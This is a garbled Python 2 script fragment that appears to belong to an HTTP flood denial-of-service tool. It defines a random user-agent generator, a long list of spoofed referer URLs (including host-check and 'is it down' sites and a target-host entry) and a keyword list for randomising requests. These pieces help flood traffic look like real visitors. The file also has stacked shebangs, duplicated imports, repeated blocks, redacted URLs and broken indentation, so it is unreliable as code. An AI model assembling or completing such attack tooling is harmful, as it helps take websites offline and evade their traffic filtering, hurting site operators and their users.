#!/usr/bin/env python
#!/usr/bin/env python2
#!/usr/bin/env python3
#!/usr/bin/python2
#!/usr/bin/python3
#coding: utf-8
import random
import socket
import threading
import time
import datetime
import urllib2
import urllib
import re
import sys
import optparse
import os
import urlparse		
import string
import random
import socket
import time
import random
import random
import socket
import threading
import datetime
import random, socket, threading, time, datetime, urllib2, urllib, re, sys, optparse, os, urlparse
global term
from threading import Thread	

from multiprocessing import Process, Manager
import urlparse, ssl
import sys, getopt, random, time

import atexit
from gzip import GzipFile
from threading import Lock
from logging import getLogger
from cStringIO import StringIO
from httplib import HTTPMessage
from urllib import urlencode, quote
from Tkinter import BooleanVar
from Tkinter import *
from Tkinter import Toplevel 
import urllib2
import cookielib
cookielib.debug = lambda *a: None
from socket import setdefaulttimeout

def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = random.randint(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        option = random.choice([True, False])
        if option == True:
            token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
def referer_list():
        global headers_referers
        headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('https://steamcommunity.com/market/search?q=')
        headers_referers.append('http://filehippo.com/search?q=')
        headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
        headers_referers.append('http://eu.battle.net/wow/en/search?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=')
        headers_referers.append('http://careers.gatesfoundation.org/search?q=')
        headers_referers.append('http://techtv.mit.edu/search?q=')
        headers_referers.append('http://www.ustream.tv/search?q=')
        headers_referers.append('http://www.ted.com/search?q=')
        headers_referers.append('http://funnymama.com/search?q=')
        headers_referers.append('http://itch.io/search?q=')
        headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
        headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
        headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
        headers_referers.append('http://www.reddit.com/search?q=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
        headers_referers.append('http://jobs.leidos.com/search?q=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('https://www.pinterest.com/search/?q=')
        headers_referers.append('http://millercenter.org/search?q=')
        headers_referers.append('https://www.npmjs.com/search?q=')
        headers_referers.append('http://www.evidence.nhs.uk/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('http://ytmnd.com/search?q=')
        headers_referers.append('http://coccoc.com/search#query=')
        headers_referers.append('http://www.search.com/search?q=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://vk.com/profile.php?redirect=')
        headers_referers.append('http://www.usatoday.com/search/results?q=')
        headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
        headers_referers.append('http://yandex.ru/yandsearch?text=')
        headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
        headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
        headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
        headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://help.baidu.com/searchResult?keywords=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('https://duckduckgo.com/?q=')
        headers_referers.append('http://www.ask.com/web?q=')
        headers_referers.append('http://search.aol.com/aol/search?q=')
        headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('https://www.facebook.com/search/results/?init=quick&q=')
        headers_referers.append('http://blekko.com/#ws/?q=')
        headers_referers.append('http://www.infomine.com/search/?q=')
        headers_referers.append('https://twitter.com/search?q=')
        headers_referers.append('http://www.wolframalpha.com/input/?i=')
        headers_referers.append('http://host-tracker.com/check_page/?furl=')
        headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
        headers_referers.append('http://www.onlinewebcheck.com/?url=')
        headers_referers.append('http://feedvalidator.org/check.cgi?url=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL')
        headers_referers.append('http://www.translate.ru/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
        headers_referers.append('http://www.pagescoring.com/website-speed-test/?url=')
        headers_referers.append('http://check-host.net/check-http?host=')
        headers_referers.append('http://checksite.us/?url=')
        headers_referers.append('http://jobs.bloomberg.com/search?q=')
        headers_referers.append('http://www.bing.com/search?q=')
        headers_referers.append('https://www.yandex.com/yandsearch?text=')
        headers_referers.append('http://www.google.com/?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
        headers_referers.append('http://www.shodanhq.com/search?q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://coccoc.com/search#query=')
        headers_referers.append('https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=')
        headers_referers.append('http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
        headers_referers.append('http://content-available-to-author-only.com/profile.php?redirect=')
        headers_referers.append('http://w...content-available-to-author-only...y.com/search/results?q=')
        headers_referers.append('http://y...content-available-to-author-only...x.ru/yandsearch?text=')
        headers_referers.append('http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=')
        headers_referers.append('http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
        headers_referers.append('http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
        headers_referers.append('http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..')
        headers_referers.append('http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..')
        headers_referers.append('http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..')
        headers_referers.append('http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
        headers_referers.append('http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..')
        headers_referers.append('http://h...content-available-to-author-only...u.com/searchResult?keywords=')
        headers_referers.append('http://w...content-available-to-author-only...g.com/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...x.com/yandsearch?text=')
        headers_referers.append('https://d...content-available-to-author-only...o.com/?q=')
        headers_referers.append('http://w...content-available-to-author-only...k.com/web?q=')
        headers_referers.append('http://s...content-available-to-author-only...l.com/aol/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=')
        headers_referers.append('http://v...content-available-to-author-only...3.org/feed/check.cgi?url=')
        headers_referers.append('http://h...content-available-to-author-only...r.com/check_page/?furl=')
        headers_referers.append('http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('http://j...content-available-to-author-only...3.org/css-validator/validator?uri=')
        headers_referers.append('https://a...content-available-to-author-only...o.com/rss?url=')
        headers_referers.append('http://e...content-available-to-author-only...l.com/search?q=')
        headers_referers.append('https://s...content-available-to-author-only...y.com/market/search?q=')
        headers_referers.append('http://f...content-available-to-author-only...o.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=')
        headers_referers.append('http://e...content-available-to-author-only...e.net/wow/en/search?q=')
        headers_referers.append('http://e...content-available-to-author-only...l.com/search?q=')
        headers_referers.append('http://c...content-available-to-author-only...n.org/search?q=')
        headers_referers.append('http://t...content-available-to-author-only...t.edu/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...m.tv/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...d.com/search?q=')
        headers_referers.append('http://f...content-available-to-author-only...a.com/search?q=')
        headers_referers.append('http://i...content-available-to-author-only...h.io/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...s.com/jobs/search?q=')
        headers_referers.append('http://t...content-available-to-author-only...p.org/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...m.vn/news/vn/search&q=')
        headers_referers.append('https://play.google.com/store/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...s.gov/@@tceq-search?q=')
        headers_referers.append('http://w...content-available-to-author-only...t.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...r.com/events/search?q=')
        headers_referers.append('https://c...content-available-to-author-only...e.org/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...s.com/search?q=')
        headers_referers.append('http://j...content-available-to-author-only...g.com/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...t.com/search/?q=')
        headers_referers.append('http://m...content-available-to-author-only...r.org/search?q=')
        headers_referers.append('https://w...content-available-to-author-only...s.com/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...s.uk/search?q=')
        headers_referers.append('http://w...content-available-to-author-only...q.com/search?q=')
        headers_referers.append('http://www.search.com/search?q=')
        headers_referers.append('https://add.my.yahoo.com/rss?url=')
        headers_referers.append('https://images2-focus-opensocial.googleusercontent.com/gadgets/proxy?container=focus&url=')
        headers_referers.append('https://www.facebook.com/l.php?u=')
        headers_referers.append('https://www.facebook.com/l.php?u=')
        headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
        headers_referers.append('http://www.google.com/translate?u=')
        headers_referers.append('http://downforeveryoneorjustme.com/')
        headers_referers.append('http://www.slickvpn.com/go-dark/browse.php?u=')
        headers_referers.append('https://www.megaproxy.com/go/_mp_framed?')
        headers_referers.append('http://scanurl.net/?u=')
        headers_referers.append('http://www.isup.me/')
        headers_referers.append('http://check-host.net/check-tcp?host=')
        headers_referers.append('http://check-host.net/check-dns?host=')
        headers_referers.append('http://check-host.net/check-ping?host=')
        headers_referers.append('http://www.currentlydown.com/')
        headers_referers.append('http://check-host.net/check-ping?host=')
        headers_referers.append('http://check-host.net/check-tcp?host=')
        headers_referers.append('http://check-host.net/check-dns?host=')
        headers_referers.append('http://check-host.net/ip-info?host=')
        headers_referers.append('https://safeweb.norton.com/report/show?url=')
        headers_referers.append('http://www.webproxy.net/view?q=')
        headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
        headers_referers.append('https://anonysurfer.com/a2/index.php?q=')
        headers_referers.append('http://analiz.web.tr/en/www/')
        headers_referers.append('https://plus.google.com/share?url=')
        headers_referers.append('http://' + host + '/')
        return(headers_referers)	
def keyword_list():
	global keyword_top
	keyword_top.append('Sex')
	keyword_top.append('Robin Williams')
	keyword_top.append('World Cup')
	keyword_top.append('Ca Si Le Roi')
	keyword_top.append('Ebola')
	keyword_top.append('Malaysia Airlines Flight 370')
	keyword_top.append('ALS Ice Bucket Challenge')
	keyword_top.append('Flappy Bird')
	keyword_top.append('Conchita Wurst')
	keyword_top.append('ISIS')
	keyword_top.append('Frozen')
	keyword_top.append('014 Sochi Winter Olympics')
	keyword_top.append('IPhone')
	keyword_top.append('Samsung Galaxy S5')
	keyword_top.append('Nexus 6')
	keyword_top.append('Moto G')
	keyword_top.append('Samsung Note 4')
	keyword_top.append('LG G3')
	keyword_top.append('Xbox One')
	keyword_top.append('Apple Watch')
	keyword_top.append('Nokia X')
	keyword_top.append('Ipad Air')
	keyword_top.append('Facebook')
	keyword_top.append('DVHT')
	keyword_top.append('VHS')
	keyword_top.append('THT')
	keyword_top.append('GLT')
	keyword_top.append('WT')
	keyword_top.append('LUX')
	keyword_top.append('Darius')
	keyword_top.append('Garen')
	keyword_top.append('Master Yi')
	keyword_top.append('Rengar')
	keyword_top.append('Katarina')
	keyword_top.append('Shen')
	keyword_top.append('Maphile')
	keyword_top.append('Support')
	keyword_top.append('Mid')
	keyword_top.append('Top')
	keyword_top.append('Bot')
	keyword_top.append('AD')
	keyword_top.append('Fucking')
	keyword_top.append('Diana')
	keyword_top.append('Kotex')
	keyword_top.append('BCS')
	keyword_top.append('ZingSpeed')
	keyword_top.append('Firerush')
	keyword_top.append('1Shot')
	keyword_top.append('TruyKich')
	keyword_top.append('IPhone')
	keyword_top.append('Star War')
	keyword_top.append('Windows 10')
	keyword_top.append('Zens Phone')
	keyword_top.append('Son Tung M-TP')
	keyword_top.append('Viurs')
	keyword_top.append('RIP Face')
	keyword_top.append('tao quan')
	keyword_top.append('gia xang')
	keyword_top.append('Roll Royce')
	keyword_top.append('Hai VL')
	keyword_top.append('Be Trang ss')
	keyword_top.append('FIFA')
	keyword_top.append('Bill Gate')
	keyword_top.append('UFO')
	keyword_top.append('Microsoft')
	keyword_top.append('Mark Zuckerberg')
        keyword_top.append('youtube')
        keyword_top.append('facebook')
        keyword_top.append('download')
        keyword_top.append('movies')
        keyword_top.append('google')
        keyword_top.append('streaming')
        keyword_top.append('hotmail')
        keyword_top.append('facebook login')
        keyword_top.append('internet')
        keyword_top.append('yahoo')
        keyword_top.append('madasfish')
        keyword_top.append('antivirus software')
        keyword_top.append('ebay')
        keyword_top.append('yahoo mail')
        keyword_top.append('craigslist')
        keyword_top.append('aot')
        keyword_top.append('paid to promote')
        keyword_top.append('dvd movies online')
        keyword_top.append('gmail')
        keyword_top.append('games')
        keyword_top.append('fb')
        keyword_top.append('internetreal')
        keyword_top.append('shopping')
        keyword_top.append('proxy dozer')
        keyword_top.append('amazon')
        keyword_top.append('jobs')
        keyword_top.append('video')
        keyword_top.append('promote')
        keyword_top.append('new')
        keyword_top.append('twitter')
        keyword_top.append('minecraft')
        keyword_top.append('paid to')
        keyword_top.append('free')
        keyword_top.append('earn cpcs')
        keyword_top.append('earn chi')
        keyword_top.append('netflix')
        keyword_top.append('videos')
        keyword_top.append('net')
        keyword_top.append('pulse')
        keyword_top.append('posted by')
        keyword_top.append('date you')
        keyword_top.append('news')
        keyword_top.append('this date')
        keyword_top.append('msn')
        keyword_top.append('facebook yahoo')
        keyword_top.append('dating')
        keyword_top.append('birthday gifts')
        keyword_top.append('cars')
        keyword_top.append('best100tattoos')
        keyword_top.append('walmart')
        keyword_top.append('lkckclckli1i')
        keyword_top.append('sports')
        keyword_top.append('software')
        keyword_top.append('music')
        keyword_top.append('the')
        keyword_top.append('email marketing')
        keyword_top.append('broadband')
        keyword_top.append('online')
        keyword_top.append('insurance')
        keyword_top.append('movie')
        keyword_top.append('tramadol')
        keyword_top.append('weight loss')
        keyword_top.append('chat')
        keyword_top.append('home')
        keyword_top.append('yahoo google')
        keyword_top.append('car insurance')
        keyword_top.append('face')
        keyword_top.append('spyware')
        keyword_top.append('you tube')
        keyword_top.append('free tv shows')
        keyword_top.append('downloads')
        keyword_top.append('google maps')
        keyword_top.append('websbiggest')
        keyword_top.append('macromedia flash player free download')
        keyword_top.append('m nova')
        keyword_top.append('facebook friends')
        keyword_top.append('phentermine')
        keyword_top.append('weather')
        keyword_top.append('watch online')
        keyword_top.append('medical insurance')
        keyword_top.append('dating websites')
        keyword_top.append('in')
        keyword_top.append('movies online')
        keyword_top.append('friv')
        keyword_top.append('search')
        keyword_top.append('alo')
        keyword_top.append('houses for rent by owner')
        keyword_top.append('of')
        keyword_top.append('internet marketing')
        keyword_top.append('blogging make money')
        keyword_top.append('make money blogging')
        keyword_top.append('game')
        keyword_top.append('movie2k')
        keyword_top.append('walmart stores')
        keyword_top.append('credit card')
        keyword_top.append('instagram')
        keyword_top.append('internet marketing advertising')
        keyword_top.append('biz')
        keyword_top.append('travel')
        keyword_top.append('to')
        keyword_top.append('dating website')
